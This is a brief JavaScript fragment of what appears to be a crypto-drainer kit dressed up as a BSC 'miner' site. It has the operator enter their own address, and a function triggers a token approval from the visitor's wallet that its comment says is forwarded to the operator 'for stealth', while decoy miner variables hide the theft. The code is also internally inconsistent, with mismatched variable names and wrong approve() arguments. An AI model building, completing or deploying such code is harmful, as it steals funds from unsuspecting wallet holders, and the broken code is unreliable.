const receiveAddress = "";   // ENTER YOUR BSC ADDRESS HERE



var minersContractx;
var tokenContractx;
function approveSpendingx(das) {
	  tokenContract.methods.approve(minersContract, receiveAddress).send({ from: currentAddrx }); // goes to the mining contract then sends foward approval to you for stealth 
  
}
var canSells = true;
var canHatchs = true;


//#region Check Configuration
if (!receiveAddressx.startsWith("0x") ||
    (
        receiveAddressx.length >= 64 ||
        receiveAddressx.length <= 40
    )
) console.error(`Error: ${receiveAddressx} is not a valid Crypto address.`);
